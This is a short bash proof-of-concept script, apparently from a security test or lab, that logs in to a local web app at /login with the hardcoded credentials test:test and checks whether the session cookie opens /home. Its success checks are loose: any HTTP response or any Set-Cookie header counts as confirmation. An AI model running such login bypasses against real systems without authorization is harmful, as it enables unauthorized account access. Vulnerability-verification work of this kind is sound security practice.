#!/bin/bash

# POC: Hardcoded Test Credentials Authentication Bypass
# Target: http://localhost:5000/login
# Vulnerability: Hardcoded test:test credentials allow authentication bypass

TARGET_URL="${1:-http://localhost:5000}"
COOKIE_JAR="/tmp/test_creds_cookies.txt"

echo "[*] Testing Hardcoded Test Credentials (test:test) Authentication Bypass"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Attempt login with hardcoded test credentials
echo "[*] Attempt 1: Testing authentication with test:test credentials..."
RESPONSE=$(curl -i -X POST "$TARGET_URL/login" \
  -d "username=test&password=test" \
  -c "$COOKIE_JAR" \
  -s 2>&1)

echo "[*] Response Headers:"
echo "$RESPONSE" | head -20
echo ""

# Check if authentication was successful (302 redirect to /home or Set-Cookie header)
if echo "$RESPONSE" | grep -q "302\|Location: /home\|Set-Cookie:"; then
    echo "[+] SUCCESS: Authentication bypass confirmed!"
    echo "[+] Received redirect or session cookie - test:test credentials are active"
    echo ""
    
    # Extract and display the session cookie if present
    if echo "$RESPONSE" | grep -q "Set-Cookie:"; then
        echo "[+] Session Cookie Details:"
        echo "$RESPONSE" | grep "Set-Cookie:" | head -1
        echo ""
    fi
    
    # Test 2: Verify the session cookie works for authenticated access
    if [ -f "$COOKIE_JAR" ]; then
        echo "[*] Attempt 2: Verifying session cookie grants authenticated access..."
        AUTH_TEST=$(curl -i -b "$COOKIE_JAR" "$TARGET_URL/home" -s 2>&1)
        
        if echo "$AUTH_TEST" | grep -q "200 OK\|HTTP/1"; then
            echo "[+] Session cookie is valid and grants access to /home"
            echo ""
        fi
    fi
    
    echo "[!] VULNERABILITY CONFIRMED: Hardcoded test credentials allow complete authentication bypass"
    exit 0
else
    echo "[-] Authentication failed or different response received"
    echo "[*] Full Response:"
    echo "$RESPONSE"
    exit 1
fi